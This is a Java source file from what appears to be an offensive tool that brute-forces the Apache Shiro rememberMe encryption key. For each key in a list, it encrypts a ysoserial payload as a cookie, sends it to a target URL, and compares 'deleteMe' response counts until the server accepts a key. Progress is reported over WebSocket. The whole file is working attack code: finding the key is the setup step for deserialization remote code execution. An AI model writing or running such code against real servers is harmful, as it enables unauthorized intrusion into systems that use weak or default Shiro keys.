package com.madao.jvav.util;

import com.madao.jvav.pojo.AllKeys;
import com.madao.jvav.service.WebSocketService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;
import java.io.IOException;

@Component
public class CheckAllKey {

    @Autowired
    private AllKeys allKeys;

    public String keyCheck(String url) throws IOException {

        String command = "java -jar ysoserial.jar ShiroCheck anything";
        byte[] payloadByte = Function.getExecByte(command);

        String errorKey = "66666666666666666666Ng==";
        String rememberMeCookie = Function.getRememberMeCookie(payloadByte, errorKey);
        int baseCount = Function.getDeleteMeCount(url, rememberMeCookie);

        int count = 0;
        for (String key : allKeys.getKeys()) {
            WebSocketService.sendMessage("[>] Trying key: "+key);
            rememberMeCookie = Function.getRememberMeCookie(payloadByte, key);
            count = Function.getDeleteMeCount(url, rememberMeCookie);
            if ( count < baseCount) {
                WebSocketService.sendMessage("[+] Find key: "+key);
                return key;
            }
        }

        WebSocketService.sendMessage("[-] can not find a valid key");
        return "未找到有效的key";
    }

}
